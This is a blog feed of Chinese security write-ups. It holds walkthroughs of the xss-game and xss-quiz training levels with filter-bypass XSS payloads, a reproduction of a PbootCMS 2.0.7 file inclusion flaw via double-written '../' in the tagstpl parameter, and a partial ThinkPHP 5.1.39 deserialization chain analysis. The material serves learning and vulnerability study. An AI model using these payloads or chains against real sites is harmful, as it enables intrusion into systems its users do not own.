<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kath4rs1s</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-09-22T02:39:00.355Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Katharsis</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>xss从零开始之刷xss-game</title>
    <link href="http://yoursite.com/2020/09/22/xss-game/"/>
    <id>http://yoursite.com/2020/09/22/xss-game/</id>
    <published>2020-09-22T01:13:22.000Z</published>
    <updated>2020-09-22T02:39:00.355Z</updated>
    
    <content type="html"><![CDATA[<h2 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h2><p>平台地址：<a href="https://xss-game.appspot.com/">https://xss-game.appspot.com/</a></p><a id="more"></a><h3 id="Level-1-Hello-world-of-XSS"><a href="#Level-1-Hello-world-of-XSS" class="headerlink" title="Level 1: Hello, world of XSS"></a>Level 1: Hello, world of XSS</h3><p>payload : </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="Level-2-Persistence-is-key"><a href="#Level-2-Persistence-is-key" class="headerlink" title="Level 2: Persistence is key"></a>Level 2: Persistence is key</h3><p>过滤了script标签，使用img+事件绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="Level-3-That-sinking-feeling…"><a href="#Level-3-That-sinking-feeling…" class="headerlink" title="Level 3: That sinking feeling…"></a>Level 3: That sinking feeling…</h3><p>这里用到了 <code>location.hash</code> ，location是javascript里边管理地址栏的内置对象，比如location.href就管理页面的url，用location.href=url就可以直接将页面重定向url。而location.hash则可以用来获取或设置页面的标签值，比如<a href="http://domain/#admin">http://domain/#admin</a> 的location.hash=”#admin”。在访问页面的时候，通过window.location.hash来判断用户需要访问的页面，然后通过javascript来调整显示页面，比如博客中用到的目录+标题就是这样的。<br>简单观察就可以发现#后面的位置存在注入，先使用闭合单引号，然后再加入弹窗事件，<br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#39; onerror&#x3D;&#39;alert(1)&#39;</span><br></pre></td></tr></table></figure><h3 id="Level-4-Context-matters"><a href="#Level-4-Context-matters" class="headerlink" title="Level 4: Context matters"></a>Level 4: Context matters</h3><p>这里有一个延时函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;&#x2F;static&#x2F;loading.gif&quot; onload&#x3D;&quot;startTimer(&#39;60&#39;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>思路是在onload中构造语句，但是过滤了分号，可以使用url编码绕过<br>下面这三个都可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39;)%3balert(&#39;1</span><br><span class="line">1&#39;||alert(&#39;1</span><br><span class="line">1&#39;)%3balert(1)%3b&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><h3 id="Level-5-Breaking-protocol"><a href="#Level-5-Breaking-protocol" class="headerlink" title="Level 5: Breaking protocol"></a>Level 5: Breaking protocol</h3><p>发现在next参数处存在注入，会把参数传递给一个a标签的src属性中，在src中使用javascript伪协议，<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?next&#x3D;javascript:alert(1)</span><br></pre></td></tr></table></figure><h3 id="Level-6-Follow-the-🐇"><a href="#Level-6-Follow-the-🐇" class="headerlink" title="Level 6: Follow the 🐇"></a>Level 6: Follow the 🐇</h3><p>传入的参数会被放在script标签的src属性中，会引入一个js脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&#x2F;static&#x2F;gadget.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;111&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>使用Data URI Scheme执行js代码<br><a href="https://www.cnblogs.com/fsjohnhuang/p/3903688.html">JS魔法堂：Data URI Scheme介绍</a><br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss-game.appspot.com&#x2F;level6&#x2F;frame#data:text&#x2F;javascript,alert(1);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;刷题&quot;&gt;&lt;a href=&quot;#刷题&quot; class=&quot;headerlink&quot; title=&quot;刷题&quot;&gt;&lt;/a&gt;刷题&lt;/h2&gt;&lt;p&gt;平台地址：&lt;a href=&quot;https://xss-game.appspot.com/&quot;&gt;https://xss-game.appspot.com/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>xss从零开始之刷xss-quiz</title>
    <link href="http://yoursite.com/2020/09/17/xss-challenges/"/>
    <id>http://yoursite.com/2020/09/17/xss-challenges/</id>
    <published>2020-09-17T10:49:55.000Z</published>
    <updated>2020-09-22T02:38:59.535Z</updated>
    
    <content type="html"><![CDATA[<h2 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h2><p>平台地址：<a href="http://xss-quiz.int21h.jp/">xss-quiz</a></p><a id="more"></a><h3 id="chanllenge1"><a href="#chanllenge1" class="headerlink" title="chanllenge1"></a>chanllenge1</h3><p>很简单，直接放payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h3 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h3><p>输入第一题payload没反应，查看源代码</p><p><img src="images/xss-challenges/20200917185937.png" alt=""></p><p>发现被嵌入在input标签中所以不会解析，需要构造一下，使其逃逸出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure><p>成功弹窗</p><p><img src="images/xss-challenges/20200917190303.png" alt=""></p><h3 id="challenge3-其它input框的xss"><a href="#challenge3-其它input框的xss" class="headerlink" title="challenge3 其它input框的xss"></a>challenge3 其它input框的xss</h3><p><img src="images/xss-challenges/20200917190428.png" alt=""></p><p>输入payload没反应，查看源代码发现会被转义，抓包发现p2参数，在p2参数处xss，成功进入下一关</p><h3 id="challenge4-隐藏input框的xss"><a href="#challenge4-隐藏input框的xss" class="headerlink" title="challenge4 隐藏input框的xss"></a>challenge4 隐藏input框的xss</h3><p>发现p1,p2参数都被转义了，查看源代码发现隐藏输入框</p><p><img src="images/xss-challenges/20200917190917.png" alt=""></p><p>把hidden改为text，输入第二关payload成功弹窗</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure><p><img src="images/xss-challenges/20200917191306.png" alt=""></p><h3 id="challenge5-前端长度限制的xss"><a href="#challenge5-前端长度限制的xss" class="headerlink" title="challenge5 前端长度限制的xss"></a>challenge5 前端长度限制的xss</h3><p>随便输入发现长度限制为15<br><img src="images/xss-challenges/20200917191618.png" alt=""></p><p>直接修改15为其他大数，然后输入payload提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain)&lt;&#x2F;script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure><p><img src="images/xss-challenges/20200917191547.png" alt=""></p><h3 id="challenge6-on事件bypass尖括号"><a href="#challenge6-on事件bypass尖括号" class="headerlink" title="challenge6 on事件bypass尖括号"></a>challenge6 on事件bypass尖括号</h3><p>过滤了尖括号，需要绕过，注意查看元素构造Payload:<br>移动鼠标触发事件：<code>&quot;onmouseover=&quot;alert(document.domain)&quot;</code><br>鼠标点击触发事件：<code>&quot;onclick=&quot;alert(document.domain)&quot;</code></p><h3 id="challenge7-不使用引号绕过引号"><a href="#challenge7-不使用引号绕过引号" class="headerlink" title="challenge7 不使用引号绕过引号"></a>challenge7 不使用引号绕过引号</h3><p>发现引号被过滤了，使用空格分隔属性，不使用”,从而绕过”。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test onmouseover&#x3D;alert(document.domain)</span><br></pre></td></tr></table></figure><h3 id="challenge8-javascript伪协议"><a href="#challenge8-javascript伪协议" class="headerlink" title="challenge8 javascript伪协议"></a>challenge8 javascript伪协议</h3><p>涨姿势了，还可以这样用，输出在href下时，使用javascript伪协议<br>常见用到威胁的属性如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">href</span><br><span class="line">backgroud</span><br></pre></td></tr></table></figure><p>bypass</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.domain);</span><br></pre></td></tr></table></figure><p>等价的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert%28document.domain%29;</span><br></pre></td></tr></table></figure><h3 id="challenge9"><a href="#challenge9" class="headerlink" title="challenge9"></a>challenge9</h3><p>好像有问题，跳过</p><h3 id="challenge10-双写绕过"><a href="#challenge10-双写绕过" class="headerlink" title="challenge10 双写绕过"></a>challenge10 双写绕过</h3><p>把domain置换为空，直接双写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(document.domdomainain)&lt;&#x2F;script&gt;&lt;&quot;</span><br></pre></td></tr></table></figure><h3 id="challenge11-编码绕过"><a href="#challenge11-编码绕过" class="headerlink" title="challenge11 编码绕过"></a>challenge11 编码绕过</h3><p>过滤了很多，script会被替换为xscript，on事件会被替换为onxxx，style会被替换为stxxx<br>使用html编码绕过构造script过滤，但是直接构造<code>&lt;scr&amp;#105;p\&gt;</code>不会解码，html编码解析只对标签里面属性的值进行解码<br>可以使用a标签中的href+伪协议把他放在属性中构造<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href&#x3D;javascr&amp;#105;pt:alert(document.domain)&gt;xss&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h3 id="challenge15-document-write"><a href="#challenge15-document-write" class="headerlink" title="challenge15 document.write()"></a>challenge15 document.write()</h3><p>尖括号和引号被过滤，但在input标签之上引用了document.write的方法<br>write() 方法可向文档写入 HTML 表达式或 JavaScript 代码。那么我们在write中写入的代码就是js的范畴了，在js中可以使用unicode编码或者十六进制编码，document.write在输出的时候会解码一下数据，把unicode编码的字符转换成实体字符，从而绕过过滤。<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(document.domain);\\u003c&#x2F;script\\u003e</span><br><span class="line">\\x3cscript\\x3ealert(document.domain);\\x3c&#x2F;script\\x3e</span><br></pre></td></tr></table></figure><p>一种是unnicode编码，一种是十六进制编码，都可以绕过。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结一下，调用js的方式：一些on事件，如:onmouseover、onclick、onerror等等。<br>如果是标签的话，要脱离其它标签才能开启js解析调用。<br>还有就是一些特定的方法，比如document.write。<br>学会构造、学会用javascript伪协议，学会编码绕过，知道浏览器解析的顺序</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;刷题&quot;&gt;&lt;a href=&quot;#刷题&quot; class=&quot;headerlink&quot; title=&quot;刷题&quot;&gt;&lt;/a&gt;刷题&lt;/h2&gt;&lt;p&gt;平台地址：&lt;a href=&quot;http://xss-quiz.int21h.jp/&quot;&gt;xss-quiz&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="xss" scheme="http://yoursite.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>PbootCMS2.0.7前台任意文件包含漏洞复现</title>
    <link href="http://yoursite.com/2020/09/16/PbootCMS-2-0-7/"/>
    <id>http://yoursite.com/2020/09/16/PbootCMS-2-0-7/</id>
    <published>2020-09-16T11:54:18.000Z</published>
    <updated>2020-09-16T13:03:00.723Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前看到网上有关于这个漏洞分析的文章，这两天没什么事情做就想着自己也看一看，分析漏洞的成因，复现一下。<br>先在github上面下载好对应版本的源码，phpstudy一把梭。</p><a id="more"></a><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>触发文件包含的地方在 <strong>core\view\View.php</strong> 文件的view类中，直接看这个方法吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">public function parser($file)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 设置主题</span><br><span class="line">    $theme &#x3D; isset($this-&gt;vars[&#39;theme&#39;]) ? $this-&gt;vars[&#39;theme&#39;] : &#39;default&#39;;</span><br><span class="line">    </span><br><span class="line">    $theme &#x3D; preg_replace(&#39;&#x2F;\.\.(\&#x2F;|\\\)&#x2F;&#39;, &#39;&#39;, $theme); &#x2F;&#x2F; 过滤掉相对路径</span><br><span class="line">    $file &#x3D; preg_replace(&#39;&#x2F;\.\.(\&#x2F;|\\\)&#x2F;&#39;, &#39;&#39;, $file); &#x2F;&#x2F; 过滤掉相对路径</span><br><span class="line"></span><br><span class="line">    if (strpos($file, &#39;&#x2F;&#39;) &#x3D;&#x3D;&#x3D; 0) &#123; &#x2F;&#x2F; 绝对路径模板</span><br><span class="line">        $tpl_file &#x3D; ROOT_PATH . $file;</span><br><span class="line">    &#125; elseif (! ! $pos &#x3D; strpos($file, &#39;@&#39;)) &#123; &#x2F;&#x2F; 跨模块调用</span><br><span class="line">        $path &#x3D; APP_PATH . &#39;&#x2F;&#39; . substr($file, 0, $pos) . &#39;&#x2F;view&#x2F;&#39; . $theme;</span><br><span class="line">        define(&#39;APP_THEME_DIR&#39;, str_replace(DOC_PATH, &#39;&#39;, $path));</span><br><span class="line">        if (! is_dir($path)) &#123; &#x2F;&#x2F; 检查主题是否存在</span><br><span class="line">            error(&#39;模板主题目录不存在！主题路径：&#39; . $path);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;tplPath &#x3D; $path;</span><br><span class="line">        &#125;</span><br><span class="line">        $tpl_file &#x3D; $path . &#39;&#x2F;&#39; . substr($file, $pos + 1);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F; 定义当前应用主题目录</span><br><span class="line">        define(&#39;APP_THEME_DIR&#39;, str_replace(DOC_PATH, &#39;&#39;, APP_VIEW_PATH) . &#39;&#x2F;&#39; . $theme);</span><br><span class="line">        if (! is_dir($this-&gt;tplPath .&#x3D; &#39;&#x2F;&#39; . $theme)) &#123; &#x2F;&#x2F; 检查主题是否存在</span><br><span class="line">            error(&#39;模板主题目录不存在！主题路径：&#39; . APP_THEME_DIR);</span><br><span class="line">        &#125;</span><br><span class="line">        $tpl_file &#x3D; $this-&gt;tplPath . &#39;&#x2F;&#39; . $file; &#x2F;&#x2F; 模板文件</span><br><span class="line">    &#125;</span><br><span class="line">    $note &#x3D; Config::get(&#39;tpl_html_dir&#39;) ? &#39;&lt;br&gt;同时检测到您系统中启用了模板子目录&#39; . Config::get(&#39;tpl_html_dir&#39;) . &#39;，请核对是否是此原因导致！&#39; : &#39;&#39;;</span><br><span class="line">    file_exists($tpl_file) ?: error(&#39;模板文件&#39; . APP_THEME_DIR . &#39;&#x2F;&#39; . $file . &#39;不存在！&#39; . $note);</span><br><span class="line">    $tpl_c_file &#x3D; $this-&gt;tplcPath . &#39;&#x2F;&#39; . md5($tpl_file) . &#39;.php&#39;; &#x2F;&#x2F; 编译文件</span><br><span class="line">                                                                   </span><br><span class="line">    &#x2F;&#x2F; 当编译文件不存在，或者模板文件修改过，则重新生成编译文件</span><br><span class="line">    if (! file_exists($tpl_c_file) || filemtime($tpl_c_file) &lt; filemtime($tpl_file) || ! Config::get(&#39;tpl_parser_cache&#39;)) &#123;</span><br><span class="line">        $content &#x3D; Parser::compile($this-&gt;tplPath, $tpl_file); &#x2F;&#x2F; 解析模板</span><br><span class="line">        file_put_contents($tpl_c_file, $content) ?: error(&#39;编译文件&#39; . $tpl_c_file . &#39;生成出错！请检查目录是否有可写权限！&#39;); &#x2F;&#x2F; 写入编译文件</span><br><span class="line">        $compile &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ob_start(); &#x2F;&#x2F; 开启缓冲区,引入编译文件</span><br><span class="line">    $rs &#x3D; include $tpl_c_file;</span><br><span class="line">    if (! isset($compile)) &#123;</span><br><span class="line">        foreach ($rs as $value) &#123; &#x2F;&#x2F; 检查包含文件是否更新,其中一个包含文件不存在或修改则重新解析模板</span><br><span class="line">            if (! file_exists($value) || filemtime($tpl_c_file) &lt; filemtime($value) || ! Config::get(&#39;tpl_parser_cache&#39;)) &#123;</span><br><span class="line">                $content &#x3D; Parser::compile($this-&gt;tplPath, $tpl_file); &#x2F;&#x2F; 解析模板</span><br><span class="line">                file_put_contents($tpl_c_file, $content) ?: error(&#39;编译文件&#39; . $tpl_c_file . &#39;生成出错！请检查目录是否有可写权限！&#39;); &#x2F;&#x2F; 写入编译文件</span><br><span class="line">                ob_clean();</span><br><span class="line">                include $tpl_c_file;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $content &#x3D; ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    return $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞触发的原因是这里对危险字符的过滤不规范导致，可以直接双写绕过</p><p><img src="/images/PbootCMS-2.0.7/20200916201028.png" alt=""></p><p>往下看</p><p><img src="/images/PbootCMS-2.0.7/20200916202648.png" alt=""></p><p>当模板文件不在缓存中的时候，会读取$tpl_file中的内容，然后写入缓存文件中并且包含。<br>也就是说，当parser函数的参数可以被控制的时候，就会造成一个任意文件包含。<br>我们要寻找一个参数可控的parser的点，然后可以在前台控制器 <strong>TagController</strong> 的index()中找到</p><p><img src="/images/PbootCMS-2.0.7/20200916202918.png" alt=""></p><p>这里调用了parser()，参数$tagstpl来自 <strong>request()</strong> 方法，这里的大概意思就是需要POST提交一个名为tagstpl的变量，就不跟过去看了。<br>$tagstpl还会拼接$this-&gt;htmldir，但是我们可以穿越目录，怎么拼接也无所谓了。<br>那这么说我们只需要post提交我们的payload就可以包含任意文件了。</p><p>读取一下根目录下的phpinfo.php</p><p><img src="/images/PbootCMS-2.0.7/20200916203938.png" alt=""></p><p>成功了。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方在2.0.8版本就即时做出了修复，看看官方是怎么修复的</p><p><img src="/images/PbootCMS-2.0.7/20200916205007.png" alt=""><br><img src="/images/PbootCMS-2.0.7/20200916204438.png" alt=""></p><p>用自定义的 <strong>preg_replace_r()</strong> 函数代替了原本的 <strong>preg_replace()</strong> ，递归替换</p><p><img src="/images/PbootCMS-2.0.7/20200916205413.png" alt=""></p><p>这里使$tagstpl强制为html后缀，无法读取任意文件了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前看到网上有关于这个漏洞分析的文章，这两天没什么事情做就想着自己也看一看，分析漏洞的成因，复现一下。&lt;br&gt;先在github上面下载好对应版本的源码，phpstudy一把梭。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="文件包含" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp_5.1.39反序列化分析</title>
    <link href="http://yoursite.com/2020/09/16/thinkphp-5-1-39/"/>
    <id>http://yoursite.com/2020/09/16/thinkphp-5-1-39/</id>
    <published>2020-09-16T02:28:25.000Z</published>
    <updated>2020-09-16T05:08:57.831Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote><p>thinkphp5.1.39<br>php7.3</p></blockquote><p>从网上下载好源码，打开 <strong>application\index\controller\Index.php</strong> 文件写入如下代码：</p><a id="more"></a><p><img src="/images/thinkphp5.1.39/20200916104528.png" alt=""></p><p>打开框架的debug模式，配置好phpstorm+chrome的调试模式，便可以开始了。</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>搜索 <strong>__destruct()</strong> 方法，和thinkphp5.0.x一样，还是在 <strong>Windows</strong>类中</p><p><img src="/images/thinkphp5.1.39/20200916104940.png" alt=""></p><p>跟进 <strong>removeFiles()</strong></p><p><img src="/images/thinkphp5.1.39/20200916105249.png" alt=""></p><p>这里的 <strong>file_exists()</strong> 中的参数是可控的，其参数会被当做字符串处理，可以触发 <strong>__toString()</strong> 方法，搜索一下这个方法，很快就找到了，在 <strong>vendor\phpspec\prophecy\src\Prophecy\Argument\Token\ExactValueToken.php</strong> 文件下的 <strong>ExactValueToken</strong> 类中有一个可以利用的函数。</p><p><img src="/images/thinkphp5.1.39/20200916105804.png" alt=""></p><p>这里的 <strong>$this-&gt;util-&gt;stringify($this-&gt;value)</strong> 两个参数都是可控的，是可以完美触发 <strong>__call()</strong> 的地方，然后搜索一下__call()，在 <strong>Request</strong> 类中</p><p><img src="/images/thinkphp5.1.39/20200916110401.png" alt=""></p><p>__call方法的第一个参数是调用的那个不存在的方法，在这里也就是 <strong>stringify</strong> ，第二个参数以数组的方式传递，数组中的值是调用不存在方法时传递的参数。<br>在这里 <strong>$this-&gt;hook</strong> 是可控的，但是 <strong>array_unshift</strong>会把 <strong>$this</strong> 放到 <strong>$args</strong> 数组的第一个元素，我们只能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array([$obj,&quot;任意方法&quot;],[$this,任意参数])</span><br><span class="line">也就是</span><br><span class="line">$obj-&gt;$func($this,$argv)</span><br></pre></td></tr></table></figure><p>这样很难直接执行我们想要的函数，但是Thinkphp作为一个web框架,<br>Request类中有一个特殊的功能就是过滤器 filter(ThinkPHP的多个远程代码执行都是出自此处)<br>我们只能想办法通过调用别的方法来达到我们想要的结果，然后也是在 <strong>Request</strong> 类中找到了 <strong>filterValue</strong> 方法</p><p><img src="/images/thinkphp5.1.39/20200916121642.png" alt=""></p><p>这里可以调用 <strong>call_user_func</strong> 来执行任意函数，需要找一个调用 <strong>filterValue</strong> 的点，发现 <strong>input</strong> 方法符合条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    public function input($data &#x3D; [], $name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)</span><br><span class="line">    &#123;</span><br><span class="line">        if (false &#x3D;&#x3D;&#x3D; $name) &#123;</span><br><span class="line">            &#x2F;&#x2F; 获取原始数据</span><br><span class="line">            return $data;</span><br><span class="line">        &#125;</span><br><span class="line">        ······</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 解析过滤器</span><br><span class="line">        $filter &#x3D; $this-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">        if (is_array($data)) &#123;</span><br><span class="line">            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</span><br><span class="line">            if (version_compare(PHP_VERSION, &#39;7.1.0&#39;, &#39;&lt;&#39;)) &#123;</span><br><span class="line">                &#x2F;&#x2F; 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span><br><span class="line">                $this-&gt;arrayReset($data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;filterValue($data, $name, $filter);</span><br><span class="line">        &#125;</span><br><span class="line">······</span><br></pre></td></tr></table></figure><p>但是这里的参数不可控，需要再寻找input参数可控的点，在 <strong>param()</strong> 中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public function param($name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)</span><br><span class="line">&#123;</span><br><span class="line">    if (!$this-&gt;mergeParam) &#123;</span><br><span class="line">        $method &#x3D; $this-&gt;method(true);</span><br><span class="line">        ······</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 当前请求参数和URL地址中的参数合并</span><br><span class="line">        $this-&gt;param &#x3D; array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br><span class="line"></span><br><span class="line">        $this-&gt;mergeParam &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (true &#x3D;&#x3D;&#x3D; $name) &#123;</span><br><span class="line">        &#x2F;&#x2F; 获取包含文件上传信息的数组</span><br><span class="line">        $file &#x3D; $this-&gt;file();</span><br><span class="line">        $data &#x3D; is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;</span><br><span class="line">        return $this-&gt;input($data, &#39;&#39;, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line">    return $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里只有 <strong>$this-&gt;param</strong> 是可控的，<strong>$filter</strong> 为空，需要再寻找调用 <strong>param()</strong> 的点，</p><p><img src="images/thinkphp5.1.39/20200916123501.png" alt=""></p><p>这里 <strong>isAjax()</strong> 参数时可控的，并且 <strong>param()</strong> 的参数 <code>$this-&gt;config\[&#39;var_ajax&#39;\]</code> 也是可控的，那这样 